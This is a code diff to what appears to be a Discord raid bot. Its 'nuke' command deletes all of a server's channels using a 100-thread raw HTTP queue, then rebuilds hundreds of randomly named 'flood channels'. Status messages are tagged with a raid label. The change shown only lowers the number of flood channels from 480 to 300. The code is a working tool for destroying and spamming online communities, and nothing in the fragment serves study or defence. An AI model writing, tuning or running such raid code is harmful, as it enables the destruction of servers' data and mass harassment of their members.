@@ -135,7 +135,7 @@ class Control(commands.Cog):
             f"☢️ **NUKE — {RAID_TAG}**\n"
             f"┣ Deleting : `{len(channels)}` channels\n"
             f"┣ Engine   : `100-thread raw HTTP queue`\n"
-            f"┗ Rebuild  : `{'✅ 480 flood channels' if rebuild else '❌'}`"
+            f"┗ Rebuild  : `{'✅ 300 flood channels' if rebuild else '❌'}`"
         )
 
     @commands.command(name="nuke")
@@ -153,7 +153,7 @@ class Control(commands.Cog):
             f"☢️ **NUKE — {RAID_TAG}**\n"
             f"┣ Deleting : `{len(channels)}` channels\n"
             f"┣ Engine   : `100-thread raw HTTP queue`\n"
-            f"┗ Rebuild  : `{'✅ 480 flood channels' if do_rebuild else '❌'}`"
+            f"┗ Rebuild  : `{'✅ 300 flood channels' if do_rebuild else '❌'}`"
         )
 
     def _start_nuke(self, guild: discord.Guild, channels: list, rebuild: bool) -> None:
@@ -174,8 +174,8 @@ class Control(commands.Cog):
             if rebuild and not se.is_set():
                 await asyncio.sleep(1.5)
 
-                # ── rebuild 480 flood channels via queue ───────────────────
-                for i in range(480):
+                # ── rebuild 300 flood channels via queue ───────────────────
+                for i in range(300):
                     if se.is_set():
                         break
                     name = f"{random.choice(_CH_NAMES)}-{i:03d}"
